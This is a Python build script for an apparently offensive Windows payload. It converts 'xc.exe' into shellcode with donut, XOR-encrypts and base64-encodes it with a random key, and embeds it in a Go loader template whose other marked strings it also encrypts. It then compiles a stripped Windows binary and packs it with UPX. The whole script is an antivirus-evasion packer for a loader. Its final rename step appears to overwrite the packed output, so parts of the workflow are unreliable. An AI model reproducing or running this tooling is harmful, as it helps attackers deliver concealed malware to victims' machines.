#!/usr/bin/env python3

import donut
import os
import base64
import warnings
import re
warnings.filterwarnings("ignore", category=DeprecationWarning) 

key = os.urandom(32)
def bake(data):
    temp  = []
    for i in range(0, len(data)): 
        temp.append(data[i] ^ key[i % len(key)]) 
    encrypted = bytes(temp)     
    encoded = base64.b64encode(encrypted)
    return encoded


# generate shellcode
shellcode = donut.create(file="xc.exe")
base64shellcode = base64.b64encode(shellcode)

# place shellcode into load.go
os.system("cp load.go load.go.bak")

with open("load.go") as f:
    temp = f.read()
    temp = temp.replace('§shellcode§',bake(shellcode).decode())
    temp = temp.replace('§key§',base64.b64encode(key).decode())     

    pattern = r"§(.*)§"
    matches = re.finditer(pattern, temp, re.MULTILINE)
    for matchNum, match in enumerate(matches, start=1):
        placeholder = match.group()
        temp = temp.replace(placeholder,bake(bytes(placeholder.replace('§',''), encoding='utf8')).decode())

with open("load.go", "w") as f:
    f.write(temp)

# compile & cleanup
os.system("rm xc.exe")
os.system('GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o raw.exe load.go')
os.system("upx raw.exe -o xc.exe")
os.system("mv raw.exe xc.exe")
os.system("cp load.go.bak load.go; rm load.go.bak")
